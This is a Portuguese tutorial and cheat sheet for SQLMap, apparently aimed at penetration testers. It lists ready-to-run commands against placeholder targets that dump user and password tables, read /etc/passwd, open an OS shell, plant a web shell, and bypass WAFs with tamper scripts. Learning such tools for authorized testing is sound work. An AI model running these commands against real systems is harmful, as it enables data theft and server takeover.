SQLMap

Ferramenta open source para deteção e exploração automatizada de injeções SQL — e tomada de controlo das bases de dados

🔗 Site oficial 📖 Documentação 📦 GitHub

O que é o SQLMap?

O SQLMap é uma ferramenta open source que automatiza o processo de deteção e exploração de vulnerabilidades de injeção SQL. O seu motor de deteção foi refinado ao longo de duas décadas de pentests reais e milhares de relatórios de bugs da comunidade, cobrindo uma vasta gama de stacks tecnológicas e casos limite, atingindo um elevado grau de precisão.

Suporta mais de 40 backends de bases de dados, tanto motores relacionais tradicionais (MySQL, Oracle, PostgreSQL, SQL Server) como data warehouses na cloud (Amazon Redshift, Snowflake, ClickHouse). Deteta e explora cinco técnicas de injeção: boolean-based blind, time-based blind, error-based, UNION query e stacked queries.

As 5 Técnicas de Injeção SQL

O SQLMap testa automaticamente todas as técnicas por defeito. A flag --technique permite restringir quais usar:

Letra Técnica Descrição
B Boolean-based blind Infere dados a partir de respostas true/false da aplicação.
E Error-based Extrai dados a partir de mensagens de erro detalhadas do DBMS.
U UNION query-based Injeta instruções UNION SELECT para obter dados pelo mesmo canal.
S Stacked queries Executa instruções adicionais separadas por ponto e vírgula.
T Time-based blind Usa atrasos (SLEEP, WAITFOR) para inferir informação.
Q Inline / out-of-band Usa funções como LOAD_FILE() ou canais OOB (DNS, HTTP).

Ordem por defeito: BEUSTQ. Exemplo para usar apenas boolean e time-based: --technique="BT".

Exemplos de Uso — da Deteção à Extração

1. Verificação manual (antes do SQLMap)

Deteção
http://target.com/page.php?id=1'

Adiciona uma aspa simples ao parâmetro. Se aparecer um erro SQL (ex: "You have an error in your SQL syntax"), o ponto é provavelmente injetável.

2. Scan básico de vulnerabilidade

Deteção
sqlmap -u "http://target.com/page.php?id=1" --batch

Testa o parâmetro id para injeção. --batch aceita as respostas por defeito sem interação.

3. Scan com verbo detalhado

sqlmap -u "http://target.com/page.php?id=1" --batch -v 3

Nível de verbosidade 3 (0-6) para ver o que o SQLMap está a fazer em detalhe.

4. POST requests

Deteção
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

Testa parâmetros enviados via POST (formulários de login, APIs).

5. Autenticação com cookies

Deteção
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch

Passa o cookie de sessão para testar áreas autenticadas.

6. Enumerar bases de dados

Enumeração
sqlmap -u "http://target.com/page?id=1" --dbs --batch

Lista todos os nomes de bases de dados disponíveis no servidor.

7. Enumerar tabelas

Enumeração
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch

Lista as tabelas dentro da base de dados especificada.

8. Enumerar colunas

Enumeração
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns --batch

Lista as colunas da tabela users.

9. Extrair dados de uma tabela

Enumeração
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump --batch

Extrai todos os registos da tabela users.

10. Extrair apenas colunas específicas

Enumeração
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump --batch

Extrai apenas as colunas username e password.

11. Informação do sistema

Enumeração
sqlmap -u "http://target.com/page?id=1" --current-user --current-db --batch

Mostra o utilizador atual e a base de dados atual.

sqlmap -u "http://target.com/page?id=1" --is-dba --batch

Verifica se o utilizador atual é administrador da base de dados.

12. Forçar DBMS específico

Avançado
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --batch

Força o SQLMap a assumir MySQL, acelerando o processo quando já sabes o backend.

13. Aumentar profundidade e risco

Avançado
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch

--level (1-5) controla quais parâmetros e headers são testados. --risk (1-3) controla a agressividade dos payloads. Níveis altos podem ser barulhentos e lentos.

14. Especificar ponto de injeção

Avançado
sqlmap -u "http://target.com/page?id=1" -p id --batch

Testa apenas o parâmetro id, ignorando os restantes.

15. Usar ficheiro de request (Burp/ZAP)

Avançado
sqlmap -r /path/to/request.txt --batch

Guarda um request intercetado no Burp ou ZAP num ficheiro e passa-o ao SQLMap. Ideal para requests complexos com muitos headers.

16. Múltiplos alvos em ficheiro

Avançado
sqlmap -m /path/to/bulkfile.txt --batch

Um ficheiro com um URL por linha. O SQLMap testa todos em sequência.

17. Google Dorks (com cautela)

Avançado
sqlmap -g "inurl:?id= site:yourdomain.com" --batch

Usa dorks do Google para encontrar URLs potencialmente vulneráveis. Usa apenas no teu próprio domínio ou com autorização explícita.

18. Shell do sistema operativo

Avançado
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

Tenta obter uma shell no sistema operativo onde a base de dados corre. Requer privilégios elevados no DBMS.

19. Ler ficheiros do sistema

Avançado
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd" --batch

Lê ficheiros do servidor através de funções SQL como LOAD_FILE().

20. Escrever ficheiros no servidor

Avançado
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

Escreve um ficheiro local no servidor alvo. Requer privilégios de escrita no DBMS.

Tamper Scripts — Bypass de WAF

Os tamper scripts modificam os payloads SQL antes de serem enviados, através de técnicas como encoding, ofuscação de keywords e substituição de operadores. São a principal arma contra WAFs.

Aplicação básica

Tamper
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

Substitui espaços por comentários /**/: SELECT id FROM users → SELECT/**/id/**/FROM/**/users.

Combinação de tamper scripts

Tamper
sqlmap -u "http://target.com/page?id=1" --tamper=randomcase,space2comment,equaltolike

Combina três técnicas: randomcase (SeLeCt), space2comment (/**/) e equaltolike (= → LIKE).

Tamper scripts mais usados

Script Função Exemplo
space2comment.py Espaços → /**/ SELECT/**/id
randomcase.py Case aleatório SeLeCt
equaltolike.py = → LIKE id LIKE 1
charencode.py URL encoding %53%45%4C%45%43%54
charunicodeencode.py Unicode encoding %u0053%u0045...
base64encode.py Base64 encoding MScgQU5E...
apostrophemask.py Mascara aspas %EF%BC%87
unmagicquotes.py Bypass magic_quotes %BF%27--

Exemplo real de bypass

sqlmap -u "https://target.com/login" --data="user=admin&pass=1" --tamper="charunicodeencode,space2hash" --level=5 --risk=3

Combinação usada em ambiente com Cloudflare + ModSecurity. Unicode encoding + comentários com hash permitiram obter a versão da base de dados.

Cheat Sheet rápido

--batch Modo não interativo
--dbs Listar bases de dados
-D dbname --tables Listar tabelas
-T users --columns Listar colunas
-T users --dump Extrair dados
--current-user Utilizador atual do DBMS
--is-dba Verificar se é admin
--tamper=script Bypass de WAF
💡 Dica: O SQLMap guarda os resultados das sessões anteriores na pasta ~/.local/share/sqlmap/output/. Se interromperes um scan, ele retoma automaticamente onde parou.
